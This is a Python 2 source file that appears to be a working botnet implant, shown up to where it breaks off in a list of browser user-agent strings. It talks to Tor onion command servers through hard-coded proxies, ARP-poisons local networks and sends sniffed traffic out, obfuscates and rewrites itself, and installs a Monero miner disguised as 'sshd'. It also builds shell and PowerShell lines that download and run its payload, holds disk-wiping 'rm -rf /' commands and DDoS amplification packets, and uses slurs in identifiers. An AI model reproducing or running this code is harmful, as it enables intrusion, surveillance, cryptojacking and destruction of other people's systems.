#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import traceback
import re,socket,subprocess,os,sys,urllib,urllib2,time,threading,random,itertools,platform,select,ssl,struct,ast,zlib,gzip,array,tarfile,select
from hashlib import sha512
from binascii import unhexlify
from base64 import b64decode,b64encode
from uuid import getnode
global variablestoreplace,functionstoreplace,stringstoreplace,alteredcode,minvarlen,minstrlen,cwasses,loggedin,portlist,validserver,mylanip,mycncip,mydomain,proxylist,maxssh,currssh,tordomainirc,tordomainsec,nmask
def obfuscate(s,kkkkey):
    return ''.join([chr(ord(c) ^ ord(kkkkey[i % len(kkkkey)])) for i, c in enumerate(s)])
if os.name == 'nt':
    import webbrowser, shutil, psutil
    from ctypes import *
    from _winreg import *
    from win32event import CreateMutex
    from win32api import GetLastError,GetCommandLine
    from winerror import ERROR_ALREADY_EXISTS
else:
    import fcntl
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO
sys.stdout = sys.stderr = open(os.devnull,'wb')
portlist = [23, 80, 443, 8000, 8080, 8181, 8081, 7001]
proxylist = ["103.46.233.81:9050", "133.242.169.64:9080", "138.201.192.217:3128", "139.59.140.163:9050", "141.144.231.30:9050", "144.126.212.105:9191", "144.24.135.159:8080", "154.39.244.171:8999", "159.223.155.90:9050", "163.172.189.78:9050", "170.75.168.116:9008", "185.110.190.83:9051", "185.132.176.254:9051", "185.90.178.20:33060", "195.123.219.213:9050", "213.151.34.209:9151", "37.230.114.173:9051", "49.12.214.66:9500", "51.222.153.159:50050", "5.196.64.226:9050", "5.9.215.110:9050", "70.36.114.104:9305", "77.68.102.66:1110", "79.137.70.101:9191", "93.188.164.44:9051", "94.103.85.88:9200", "94.182.176.132:3306"]
minvarlen=5
minstrlen=6
stringstoreplace = []
mydomain = ""
mycncip = ""
loggedin = -1
global paramiko_imported
paramiko_imported=False
blacklist = [6697, 587, 23, 443, 37215, 53, 22, 443, 37215]
PAYLOAD = {
    '\x73\x6e\x6d\x70':('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00'),  
    '\x6e\x74\x70':('\x17\x00\x02\x2a'+'\x00'*4),
    '\x63\x6c\x64\x61\x70':('\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00'),
}
global mylanip
try:
    getips = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    getips.connect(("1.0.0.1", 53))
    mylanip=getips.getsockname()[0]
    getips.close()
except:
    mylanip=""
def getPoisonIPs():
    poison=[]
    fh=open("/proc/net/arp", "rb")
    table_=fh.readlines()
    fh.close()
    table_.pop(0)
    for x in table_:
        x=x.split()
        if x[2]=="0x2":
            if x[0] != mylanip:
                poison.append((x[0], x[3]))
    return poison
def get_src_mac():
    mac_dec = hex(getnode())[2:-1]
    while (len(mac_dec) != 12):
        mac_dec = "0" + mac_dec
    return unhexlify(mac_dec)
global mymac
mymac=get_src_mac().encode('hex')
def get_default_gateway_linux():
    with open("/proc/net/route") as fh:
        for line in fh:
            fielssds = line.strip().split()
            if fielssds[1] != '00000000' or not int(fielssds[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fielssds[2], 16)))
def all_interfaces():
    if os.name == 'nt':
        return ""
    max_possible = 128 * 32
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    names = array.array('B', '\0' * max_possible)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        s.fileno(),
        0x8912,
        struct.pack('iL', max_possible, names.buffer_info()[0])
    ))[0]
    namestr = names.tostring()
    lst = []
    for i in range(0, outbytes, 40):
        lst.append(namestr[i:i+16].split('\0', 1)[0])
    return lst
def poison(iface):
    global mymac
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
    s.bind((iface, 0))
    while(1):
        for lmfao in getPoisonIPs():
            src_addr = mymac
            dst_addr = lmfao[0]
            src_ip_addr = get_default_gateway_linux()
            dst_ip_addr = lmfao[1]
            dst_mac_addr = "\x00\x00\x00\x00\x00\x00"
            payload = "\x00\x01\x08\x00\x06\x04\x00\x02"
            mychecksum = "\x00\x00\x00\x00"
            ethertype = "\x08\x06"
            s.send(dst_addr + src_addr + ethertype + payload+src_addr + src_ip_addr
                   + dst_mac_addr + dst_ip_addr + mychecksum)
        time.sleep(2)
def daemonize():
    if os.name == 'nt':
        return 1
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        return 0
    return 1
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
global myfullpath
myfullpath=os.path.realpath(__file__)
inputfile=open(myfullpath,"rb")
startingcode=inputfile.read()
inputfile.close()
class AnalyzeStrings(ast.NodeVisitor):
    def visit_Str(self, node): 
        try:
            readingLine=startingcode.split("\n")[node.lineno-1]
            stringChar=readingLine[node.col_offset:node.col_offset+len(node.s)+2][0]
            stringFound=eval(repr(stringChar + "".join(readingLine[node.col_offset+1:node.col_offset+len(node.s)+len(readingLine[node.col_offset-1:node.col_offset+len(node.s)+1].split(readingLine[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4][:readingLine[node.col_offset+1:node.col_offset+len(node.s)+len(readingLine[node.col_offset-1:node.col_offset+len(node.s)+2].split(readingLine[node.col_offset+1:node.col_offset+len(node.s)+2][0])[0])+4].find(stringChar)]) + stringChar))
            if len(stringFound)>=minstrlen and "\\x" not in stringFound and stringFound not in stringstoreplace:
                stringstoreplace.append(stringFound)
        except:
            pass
def csum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
class IPHEADER(object):
    def __init__(self, source, destination, payload='', ipproto=socket.IPPROTO_UDP):
        self.ipversion = 4
        self.ihl = 5
        self.tos = 0
        self.tl = 20+len(payload)
        self.id = 0
        self.asdflags = 0
        self.offset = 0
        self.ttl = 255
        self.protocol = ipproto
        self.checksum = 2
        self.source = socket.inet_aton(source)
        self.destination = socket.inet_aton(destination)
    def mkpkt(self):
        ver_ihl = (self.ipversion << 4) + self.ihl
        flags_offset = (self.asdflags << 13) + self.offset
        ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    self.checksum,
                    self.source,
                    self.destination)
        self.checksum = csum(ip_header)
        ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    self.tos,
                    self.tl,
                    self.id,
                    flags_offset,
                    self.ttl,
                    self.protocol,
                    socket.htons(self.checksum),
                    self.source,
                    self.destination)  
        return ip_header
class UDPHEADER(object):
    def __init__(self, src, dst, payload=''):
        self.src = src
        self.dst = dst
        self.payload = payload
        self.checksum = 0
        self.length = 8
    def mkpkt(self, src, dst, ipproto=socket.IPPROTO_UDP):
        length = self.length + len(self.payload)
        pseudo_header = struct.pack('!4s4sBBH',
            socket.inet_aton(src), socket.inet_aton(dst), 0, 
            ipproto, length)
        self.checksum = csum(pseudo_header)
        packet = struct.pack('!HHHH',
            self.src, self.dst, length, 0)
        return packet
def randomstring(strlength):
    return ''.join(random.choice("abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(strlength))
def RaiseIfZero(result,func=None,arguments=()):
    if not result:
        raise WinError()
    return result
def _Cl0seServiceHandle(hService):
    _CloseServiceHandle=windll.advapi32.CloseServiceHandle
    _CloseServiceHandle.argtypes=[wintypes.SC_HANDLE]
    _CloseServiceHandle.restype =bool
    _CloseServiceHandle.errcheck=RaiseIfZero
    _CloseServiceHandle(hService)
if os.name=="nt":
    class Handle(object):
        def __init__(self,aHandle=None,bOwnership=True):
            super(Handle,self).__init__()
            self._value    =self._normalize(aHandle)
            self.bOwnership=bOwnership
        @property
        def value(self):
            return self._value
        def _normalize(self,value):
            if hasattr(value,'value'):
                value=value.value
            if value is not None:
                value=long(value)
            return value
    class UserModeHandle(Handle):
        _HYPE=wintypes.HANDLE
        def _close(self):
            raise NotImplementedError()
        @property
        def _as_parameter_(self):
            return self._HYPE(self.value)
        @staticmethod
        def from_param(value):
            return self._HYPE(self.value)
    class ServiceHandle(UserModeHandle):
        _HYPE=wintypes.SC_HANDLE
        def _close(self):
            _Cl0seServiceHandle(self.value)
    def _0penSCManagerA(lpMachineName=None,lpDatabaseName=None,dwDesiredAccess=0xF003F):
        _OpenSCManagerA=windll.advapi32.OpenSCManagerA
        _OpenSCManagerA.argtypes=[wintypes.LPSTR,wintypes.LPSTR,wintypes.DWORD]
        _OpenSCManagerA.restype =wintypes.SC_HANDLE
        _OpenSCManagerA.errcheck=RaiseIfZero
        return ServiceHandle(_OpenSCManagerA(lpMachineName,lpDatabaseName,dwDesiredAccess))
    def CreeaateServiceA(hSCManager,lpServiceName,
                       lpDisplayName=None,
                       dwDesiredAccess=0xF01FF,
                       dwServiceType=0x00000020,
                       dwStartType=0x00000002,
                       dwErrorControl=0x00000001,
                       lpBinaryPathName=None,
                       lpLoadOrderGroup=None,
                       lpDependencies=None,
                       lpServiceStartName=None,
                       lpPassword=None):
        if not hasattr(wintypes,'LPDWORD'):
            wintypes.LPDWORD=POINTER(wintypes.DWORD)
        _CreateServiceA=windll.advapi32.CreateServiceA
        _CreateServiceA.argtypes=[wintypes.SC_HANDLE,wintypes.LPSTR,wintypes.LPSTR,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.DWORD,wintypes.LPSTR,wintypes.LPSTR,wintypes.LPDWORD,wintypes.LPSTR,wintypes.LPSTR,wintypes.LPSTR]
        _CreateServiceA.restype =wintypes.SC_HANDLE
        _CreateServiceA.errcheck=RaiseIfZero
        dwTagId=wintypes.DWORD(0)
        return ServiceHandle(_CreateServiceA(hSCManager,lpServiceName,lpDisplayName,dwDesiredAccess,dwServiceType,dwStartType,dwErrorControl,lpBinaryPathName,lpLoadOrderGroup,byref(dwTagId),lpDependencies,lpServiceStartName,lpPassword)),dwTagId.value
    def StaartServiceA(hService):
        _StartServiceA=windll.advapi32.StartServiceA
        _StartServiceA.argtypes=[wintypes.SC_HANDLE,wintypes.DWORD,wintypes.LPVOID]
        _StartServiceA.restype =bool
        _StartServiceA.errcheck=RaiseIfZero
        dwNumServiceArgs=0
        lpServiceArgVectors=None
        _StartServiceA(hService,dwNumServiceArgs,lpServiceArgVectors)
    def DeletService(hService):
        _DeleteService=windll.advapi32.DeleteService
        _DeleteService.argtypes=[wintypes.SC_HANDLE]
        _DeleteService.restype =bool
        _DeleteService.errcheck=RaiseIfZero
        _DeleteService(hService)
class mainprocess():
    def getMyCurrentIP(self):
        myip="Unknown"
        try:
            myip=urllib2.urlopen("https://api.ipify.org/").read()
        except:
            try:
                myip=urllib2.urlopen("http://ipinfo.io/ip").read()
            except:
                try:
                    myip=urllib2.urlopen("https://www.trackip.net/ip").read()
                except:
                    try:
                        myip=urllib2.urlopen("http://ifconfig.me/").read()
                    except:
                        try:
                            myip=urllib2.urlopen("http://icanhazip.com/").read().replace("\n","")
                        except:
                            pass
        return myip
    def myhttpd(self,myport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', myport))  
        sock.listen(5)  
        while 1:
            try:
                connection,address = sock.accept()
                requesty=self.recvTimeout(connection, 1024)
                if "GET /" in requesty:
                   fh=open(requesty.split(" ")[1].replace("/", ""), "rb")
                   connection.send(requesty.split(" ")[2] + " 200 OK\nServer: get-necro-httpd\nConnection: close\n\n"+fh.read())
                   fh.close()
                else:
                    connection.send(requesty.split(" ")[2] + " 418 I'm a teapot\nServer: get-necro-httpd\nConnection: close\n\nSrry bro go to the coffee brewster")
                connection.close()
            except:
                continue
    def is_socket_valid(self, socket_instance):
        if not socket_instance:
            return False
        try:
            socket_instance.getsockname()
        except socket.error:
            return False
        try:
            socket_instance.getpeername()
        except socket.error:
            return False
        return True
    def stringproc(self,s):
        ch = (ord(c) for c in s)
        return ''.join(('\\x%02x' % c) if c <= 255 else ('\\u%04x' % c) for c in ch)
    def repackbot(self):
            variablestoreplace = []
            functionstoreplace = []
            cwasses = []
            inputfile=open(myfullpath,"rb")
            startingcode=alteredcode=inputfile.read()
            inputfile.close()
            p = ast.parse(startingcode)
            AnalyzeStrings().visit(p)
            for tricky in sorted(stringstoreplace, key=len, reverse=True):
                if len(tricky)>=minstrlen:
                    kkkkey=os.urandom(minstrlen)
                    try:
                        if (tricky[0] == "'" and tricky[-1] == "'") or (tricky[0] == '"' and tricky[-1] == '"'):
                            alteredcode=alteredcode.replace(tricky, "obfuscate(zlib.decompress(\x22"+self.stringproc(zlib.compress(obfuscate(tricky[1:-1].decode('string_escape'), kkkkey)))+"\x22), \x22"+self.stringproc(kkkkey)+"\x22)")
                        else:
                            alteredcode=alteredcode.replace(tricky, "obfuscate(zlib.decompress(\x22"+self.stringproc(zlib.compress(obfuscate(eval(tricky).decode('string_escape'), kkkkey)))+"\x22), \x22"+self.stringproc(kkkkey)+"\x22)")
                    except:
                        pass
            cwasses = [node.name for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
            variablestoreplace = sorted({node.id for node in ast.walk(p) if isinstance(node, ast.Name) and not isinstance(node.ctx, ast.Load)})
            for varwtf in startingcode.split("self."):
                va2add = varwtf.replace(" ", "").replace("\t", "").split("=")[0].split(",")[0].split(".")[0].split("[")[0].split("(")[0].split(")")[0].split("+")[0].split("-")[0].split(":")[0]
                if va2add not in variablestoreplace and len(va2add)>=minvarlen:
                    variablestoreplace.append(va2add)
            for fwunction in [n for n in p.body if isinstance(n, ast.FunctionDef)]:
                functionstoreplace.append(fwunction.name)
            cwasses = [node for node in ast.walk(p) if isinstance(node, ast.ClassDef)]
            for cwass in cwasses:
                for fwunction in [n for n in cwass.body if isinstance(n, ast.FunctionDef)]:
                    if fwunction.name != "__init__" and fwunction not in functionstoreplace:
                        functionstoreplace.append(fwunction.name)
            randarry=[]
            alls=[]
            for i in range(len(functionstoreplace)+len(variablestoreplace)+len(cwasses)):
                randstring = randomstring(random.randint(8,12))
                while randstring in randarry:
                    randstring = randomstring(random.randint(8,12))
                randarry.append(randstring)
            totalcount=0
            for vawiable in sorted(variablestoreplace, key=len, reverse=True):
                if len(vawiable) >= minvarlen and vawiable != "self" and not vawiable.startswith("__"):
                    alteredcode=alteredcode.replace(vawiable, randarry[totalcount])
                totalcount+=1
            for fwunction in sorted(functionstoreplace, key=len, reverse=True):
                alteredcode=alteredcode.replace(fwunction, randarry[totalcount])
                totalcount+=1
            for cwass in cwasses:
                alls.append(randarry[totalcount])
                alteredcode=alteredcode.replace(cwass.name, randarry[totalcount])
                totalcount+=1
            outputfile=open(myfullpath,"wb")
            outputfile.write(alteredcode)
            outputfile.close()
    def massiverift(self):
        return
        if not __file__.endswith("py"):
            return
        if not self.fileprotect:
            return
        datfilesexy=open(__file__, "rb")
        bogus_hdwipekeycrap=datfilesexy.read().split("protector")[2].split("\n")
        datfilesexy.close()
        while self.fileprotect:
            dirs=[os.getcwd(), os.getenv("USERPROFILE") if os.name() == 'nt' else os.getenv("HOME"), os.getenv("TEMP")]
            for x in dirs:
                for dirpath, dirs, files in os.walk("."): 
                    for filename in files:
                        fname = os.path.join(dirpath,filename)
                        if __file__ not in fname:
                          with open(fname) as myfile:
                            shitdata = myfile.read()
                            for niggadead in bogus_hdwipekeycrap:
                                if niggadead in shitdata:
                                    for cmdbrick in "cat /proc/mounts\ncat /dev/urandom | mtd_write mtd0 - 0 32768\ncat /dev/urandom | mtd_write mtd1 - 0 32768\n' ii11II += 'busybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/sda &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\n' ii11II += 'busybox route del default\ncat /dev/urandom >/dev/mtdblock0 &\ncat /dev/urandom >/dev/mtdblock1 &\ncat /dev/urandom >/dev/mtdblock2 &\ncat /dev/urandom >/dev/mtdblock3 &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mmcblk0 &\ncat /dev/urandom >/dev/mmcblk0p9 &\ncat /dev/urandom >/dev/mmcblk0p12 &\ncat /dev/urandom >/dev/mmcblk0p13 &\ncat /dev/urandom >/dev/root &\ncat /dev/urandom >/dev/mmcblk0p8 &\ncat /dev/urandom >/dev/mmcblk0p16 &\n' ii11II += 'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &\niptables -F;iptables -t nat -F;iptables -A INPUT -j DROP;iptables -A FORWARD -j DROP\nhalt -n -f\nreboot\n".split("\n"):
                                        os.system(cmdbrick)
    def bigSNIFFS(self):
        global proxylist
        p = 0
        for iface in all_interfaces():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                result = fcntl.ioctl(s.fileno(), 0x8913, iface + '\0'*256)
                flag_ss, = struct.unpack('H', result[16:18])
                up = flag_ss & 1
            except:
                pass
            if up == 1:
                threading.Thread(target=poison, args=(iface,)).start()
                break
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except:
            return
        pktcount = 0
        ss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        while True:
            try:
                while self.snifferenabled == 0:
                    time.sleep(1)
                if not self.is_socket_valid(ss):
                    myproxy = random.choice(proxylist)
                    while 1:
                        try:
                            ss=socks.socksocket()
                            ss.setproxy(socks.PROXY_TYPE_SOCKS5, myproxy.split(":")[0], int(myproxy.split(":")[1]), True)
                            ss.connect(("xb3tkgkwkhhxfmi7nztgh4l47hh5fumugh4npbxjt4t7vziiubvaocyd.onion", 139))
                            break
                        except:
                            continue
                packet = s.recvfrom(65565)
                pktcount=pktcount+1
                packet=packet[0]
                eth_length = 14
                eth_header = packet[:eth_length]
                eth_unpack  =  struct.unpack('!6s6sH',eth_header)
                eth_protocol = socket.ntohs(eth_unpack[2])
                ip_header = packet[0:20]
                header_unpacked = struct.unpack('!BBHHHBBH4s4s',ip_header)
                version_ih1= header_unpacked[0] 
                ipversion = version_ih1 >> 4 
                ih1 = version_ih1 & 0xF
                iph_length = ih1*4
                ttl = header_unpacked[5]
                protocol = header_unpacked[6]
                source_add = socket.inet_ntoa(header_unpacked[8])
                destination_add = socket.inet_ntoa(header_unpacked[9])
                tcp_header = packet[iph_length:iph_length+20]
                tcph = struct.unpack('!HHLLBBHHH',tcp_header)
                src_port = tcph[0]
                dest_port = tcph[1]
                sequence = tcph[2]
                resrve = tcph[4]
                tcph_len = resrve >> 4
                h_size = iph_length+tcph_len*4
                data_size = len(packet)-h_size
                data = packet[h_size:]
                if len(data) > 10 and src_port not in blacklist and dest_port not in blacklist and destination_add not in self.scanips and source_add not in self.scanips:
                    try:
                        ss.send("IPv"+str(ipversion)+ "\nttl:"+str(ttl)+"\nproto:"+str(protocol)+"\nsrcip:"+str(source_add)+"\ndstip:"+str(destination_add)+"\n\nsrcprt:"+str(src_port)+"\ndstprt:"+str(dest_port)+"\nBEGIN\n"+data+"\nEND\n")
                    except:
                        pass
            except:
                pass
    def available_cpu_count(self):
        try:
            m = re.search(r'(?m)^Cpus_allowed:\s*(.*)$',
                          open('/proc/self/status').read())
            if m:
                res = bin(int(m.group(1).replace(',', ''), 16)).count('1')
                if res > 0:
                    return res
        except IOError:
            pass
        try:
            res = int(os.sysconf('SC_NPROCESSORS_ONLN'))
            if res > 0:
                return res
        except (AttributeError, ValueError):
            pass
        try:
            res = int(os.environ['NUMBER_OF_PROCESSORS'])
            if res > 0:
                return res
        except (KeyError, ValueError):
            pass
        try:
            from java.lang import Runtime
            runtime = Runtime.getRuntime()
            res = runtime.availableProcessors()
            if res > 0:
                return res
        except ImportError:
            pass
        try:
            sysctl = subprocess.Popen(['sysctl', '-n', 'hw.ncpu'],
                                      stdout=subprocess.PIPE)
            scStdout = sysctl.communicate()[0]
            res = int(scStdout)
            if res > 0:
                return res
        except (OSError, ValueError):
            passl
        try:
            res = open('/proc/cpuinfo').read().count('processor\t:')
            if res > 0:
                return res
        except IOError:
            pass
        try:
            pseudoDevices = os.listdir('/devices/pseudo/')
            res = 0
            for pd in pseudoDevices:
                if re.match(r'^cpuid@[0-9]+$', pd):
                    res += 1
            if res > 0:
                return res
        except OSError:
            pass
        try:
            try:
                dmesg = open('/var/run/dmesg.boot').read()
            except IOError:
                dmesgProcess = subprocess.Popen(['dmesg'], stdout=subprocess.PIPE)
                dmesg = dmesgProcess.communicate()[0]
            res = 0
            while '\ncpu' + str(res) + ':' in dmesg:
                res += 1
            if res > 0:
                return res
        except OSError:
            pass
        raise Exception('Can not determine number of CPUs on this system')
    def __trafficdecrypt__(self, word, skelekey):
        return ''.join([chr(ord(v) ^ ord(skelekey[i % len(skelekey)])) for i, v in enumerate(word)])
    def ntpshit(self):
        clienntt=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        clienntt.sendto('\x1b'+47 * '\0',("time.google.com",123))
        msg,address=clienntt.recvfrom(1024)
        return struct.unpack("!12I",msg)[10] - 2208988800
    def __init__(self):
        global mydomain,stupidnigeria,winbox,proxylist,myproxy
        self.activehttpd=0
        while 1:
            try:
                myport=random.randint(1024,65535)
                findopenport=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                findopenport.settimeout(0.1)
                findopenport.connect(("0.0.0.0", myport))
            except:
                threading.Thread(target=self.myhttpd, args=(myport,)).start()
                mydomain=self.getMyCurrentIP()+":"+str(myport)
                time.sleep(0.05)
                break
        while 1:
            myproxy = random.choice(proxylist)
            try:
                protector="progressive"
                t=self.ntpshit()
                self._binary32=lambda x : ''.join([str((x >> i) & 1) for i in range(32)])
                securesock=socks.socksocket()
                securesock.setproxy(socks.PROXY_TYPE_SOCKS5, myproxy.split(":")[0], int(myproxy.split(":")[1]), True)
                securesock.connect(("55etf3fxdvtga4fog5qiggltarsmfes7pzpcwoqtlkggtay7etxo3bqd.onion", 52566))
                skelekey=securesock.recv(32)
                securesock.send(''.join([chr(random.randint(0,128)) if x == "0" else chr(random.randint(128,255)) for x in self._binary32(t)]))
                lengthlistlol=securesock.recv(32)
                chanlength=ord(lengthlistlol[-5])
                keylength=ord(lengthlistlol[-4])
                passwlen=ord(lengthlistlol[-3])
                prefixlen=ord(lengthlistlol[-2])
                domainlen=ord(lengthlistlol[-1])
                self.mychan=zlib.decompress(self.__trafficdecrypt__(securesock.recv(chanlength),skelekey))
                self.chankey=zlib.decompress(self.__trafficdecrypt__(securesock.recv(keylength),skelekey))
                authshit=zlib.decompress(self.__trafficdecrypt__(securesock.recv(passwlen),skelekey)).split("!")
                self.knightpasswd=authshit[0]
                self.masters=authshit[1].split(",")
                self.cmdprefix=zlib.decompress(self.__trafficdecrypt__(securesock.recv(prefixlen),skelekey))
                self.injectdomain=zlib.decompress(self.__trafficdecrypt__(securesock.recv(domainlen),skelekey))
                securesock.send(chr(len(mydomain)))
                securesock.send(mydomain)
                if "\x01"!=securesock.recv(1):
                    mydomain=self.injectdomain
                protector="progressive"
                securesock.close()
                break
            except:
                if time.clock()>3600:
                    sys.exit(1)
                continue
        random.seed(a=time.time()*os.getpid())
        self.repackbot()
        os.system("echo 'ARGS=\"-o pool.minexmr.com:4444 -u 45Q5mZS74P18E7q3UEMErrLW6GvvT8GQBjFdFVKFdq27VFeTEhyWKDkcZo5XgAT6Qy1JSsMio2oxAj9uEy7dSJY5HTW8RDP -p Network --cpu-no-yield --asm=auto --cpu-memory-pool=-1 -B\"; running=$(ps h -C \".bootstrap.sh\" | grep -wv $$ | wc -l); [[ $running -ge 1 ]] && exit; curl http://DOMAIN/xmrig1 -O||wget http://DOMAIN/xmrig1 -O xmrig1;mkdir $PWD/.1;mv -f xmrig1 $PWD/.1/sshd;chmod 777 $PWD/.1/sshd;curl http://DOMAIN/xmrig -O||wget http://DOMAIN/xmrig -O xmrig;mkdir $PWD/.2;mv -f xmrig $PWD/.2/sshd;chmod 777 $PWD/.2/sshd;$PWD/.1/sshd $ARGS||$PWD/.2/sshd $ARGS'>$PWD/.bootstrap.sh;$PWD/.bootstrap.sh&")
        stupidnigeria = "cd /tmp||cd $(find / -writable -readable -executable | head -n 1);wget http://DOMAIN/setup -O setup||curl http://DOMAIN/setup -O;chmod 777 setup;./setup;wget http://DOMAIN/setup.py -O setup.py||curl http://DOMAIN/setup.py -O;chmod 777 setup.py;python2 setup.py||python2.7 setup.py||python setup.py||./setup.py&".replace("DOMAIN", mydomain)
        winbox = "@powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/manthey/pyexe/releases/download/v18/py27.exe','python.exe');(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');\"&.\python.exe setup.py".replace("DOMAIN", mydomain)
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.botid=randomstring(random.randrange(8,16))
        self.scanthreadzactive=0
        self.stopshit=0
        self.cmdprefix="."
        self.exploitstats={"gaybots":[0,0]}
        self.scannerenabled = 1
        self.snifferenabled = 1
        self.fileprotect = 0
        self.scanips=[]
        threading.Thread(target=self.bigSNIFFS).start()
        threading.Thread(target=self.infecthtmljs).start()
        self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(self.available_cpu_count())+"]"+str(self.botid)
        self.aRHRPteL="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(self.available_cpu_count())+"]"+str(self.botid)
        self.GbASkEbE=["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
        "Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
